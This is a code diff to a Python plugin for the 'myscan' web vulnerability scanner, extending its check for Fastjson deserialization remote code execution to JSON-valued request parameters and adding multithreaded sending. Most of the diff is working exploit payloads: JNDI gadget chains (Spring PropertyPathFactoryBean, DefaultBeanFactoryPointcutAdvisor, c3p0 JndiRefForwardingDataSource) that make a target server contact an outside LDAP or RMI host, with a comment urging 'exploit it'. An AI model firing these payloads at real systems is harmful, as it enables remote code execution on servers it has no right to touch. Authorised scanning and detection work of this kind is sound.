@@ -5,8 +5,11 @@
 from myscan.lib.parse.dictdata_parser import dictdata_parser  # 写了一些操作dictdata的方法的类
 from myscan.lib.helper.request import request  # 修改了requests.request请求的库，建议使用此库，会在redis计数
 from myscan.lib.core.base import PocBase
-from myscan.lib.core.common import get_random_str
+from myscan.lib.core.common import get_random_str, isjson
 from myscan.lib.core.common_reverse import generate, query_reverse
+from myscan.lib.core.const import notAcceptedExt
+from myscan.lib.core.threads import mythread
+from myscan.lib.core.data import cmd_line_options
 
 
 class POC(PocBase):
@@ -19,13 +22,28 @@ class POC(PocBase):
         self.name = "fastjson_deserialization_rce"
         self.vulmsg = "cool rce ! exploit it ! "
         self.level = 1  # 0:Low  1:Medium 2:High
+        self.saveflags = {}
 
     def verify(self):
-        if not self.dictdata.get("request").get("content_type") == 4:  # data数据类型为json
+        if self.dictdata.get("url").get("extension") in notAcceptedExt:
             return
         if not self.can_output(self.parse.getrootpath() + self.name):  # 限定只输出一次
             return
 
+        needtests = []
+        # body为json类型
+        if self.dictdata.get("request").get("content_type") == 4:  # data数据类型为json
+            needtests.append(None)
+
+        # 针对参数为json格式
+
+        params = self.dictdata.get("request").get("params").get("params_url") + \
+                 self.dictdata.get("request").get("params").get("params_body")
+        for param in params:
+            arg = param.get("value", "")
+            if isjson(arg):
+                needtests.append(param)
+        # test payloads
         payloads = [
             {
                 "vul": "ver=1.2.47",
@@ -94,8 +112,8 @@ class POC(PocBase):
                 "type": "ldap"
             },
             {
-              "vul":"spring-context:4.3.7.RELEASE",
-              "payload":'''{
+                "vul": "spring-context:4.3.7.RELEASE",
+                "payload": '''{
   "ransdasd1": {
     "@type": "org.springframework.beans.factory.config.PropertyPathFactoryBean",
     "targetBeanName": "%(ldap)s",
@@ -111,8 +129,8 @@ class POC(PocBase):
                 "type": "ldap"
             },
             {
-                "vul":"unknown",
-                "payload":'''{
+                "vul": "unknown",
+                "payload": '''{
   "raasd2nd1": Set[
   {
     "@type": "org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor",
@@ -131,8 +149,8 @@ class POC(PocBase):
                 "type": "ldap"
             },
             {
-                "vul":"unknown",
-                "payload":'''{
+                "vul": "unknown",
+                "payload": '''{
   "rand1": {
     "@type": "com.mchange.v2.c3p0.JndiRefForwardingDataSource",
     "jndiName": "%(ldap)s",
@@ -142,27 +160,17 @@ class POC(PocBase):
                 "type": "ldap"
             }
         ]
-        saveflags = {}
+        datas = []
         for payload in payloads:
-            random_str = get_random_str(5).lower() + payload.get("vul", "")
-            data_with_payload = ""
-            if payload.get("type") == "ldap":
-                ldapaddr, ldaphexdata = generate(self.parse.getrootpath() + random_str, "ldap")
-                data_with_payload = payload.get("payload") % {"ldap": ldapaddr}
-                saveflags[ldaphexdata] = (data_with_payload, payload.get("vul", ""))
-            elif payload.get("type") == "rmi":
-                rmiaddr, rmihexdata = generate(self.parse.getrootpath() + random_str, "rmi")
-                data_with_payload = payload.get("payload") % {"rmi": rmiaddr}
-                saveflags[rmihexdata] = (data_with_payload, payload.get("vul", ""))
-            req = self.parse.generaterequest({"data": data_with_payload})
-            r = request(**req)
-        # query
-        i = 0
-        success = False
-        for hexdata, msg in saveflags.items():
+            for arg in needtests:
+                datas.append((payload, arg))
+        mythread(self.send_payload, datas, cmd_line_options.threads)
+        # query reverse log
+        sleep = True
+        for hexdata, msg in self.saveflags.items():
             payload, vul = msg
-            sleep = True if i == 0 else False
             res, resdata = query_reverse(hexdata, sleep)
+            sleep = False
             if res:
                 self.result.append({
                     "name": self.name,
@@ -177,8 +185,22 @@ class POC(PocBase):
                         "response": self.parse.getresponseraw()
                     }
                 })
-                success = True
-            i += 1
-        if success:
-            if not self.can_output(self.parse.getrootpath() + self.name):  # 其他进程如果发现了，则不在输出
                 self.can_output(self.parse.getrootpath() + self.name, True)
+
+    def send_payload(self, data):
+        payload, param = data
+        random_str = get_random_str(5).lower() + payload.get("vul", "")
+        data_with_payload = ""
+        if payload.get("type") == "ldap":
+            ldapaddr, ldaphexdata = generate(self.parse.getrootpath() + random_str, "ldap")
+            data_with_payload = payload.get("payload") % {"ldap": ldapaddr}
+            self.saveflags[ldaphexdata] = (data_with_payload, payload.get("vul", ""))
+        elif payload.get("type") == "rmi":
+            rmiaddr, rmihexdata = generate(self.parse.getrootpath() + random_str, "rmi")
+            data_with_payload = payload.get("payload") % {"rmi": rmiaddr}
+            self.saveflags[rmihexdata] = (data_with_payload, payload.get("vul", ""))
+        if param is None:
+            req = self.parse.generaterequest({"data": data_with_payload})
+        else:
+            req = self.parse.getreqfromparam(param, "w", data_with_payload)
+        r = request(**req)
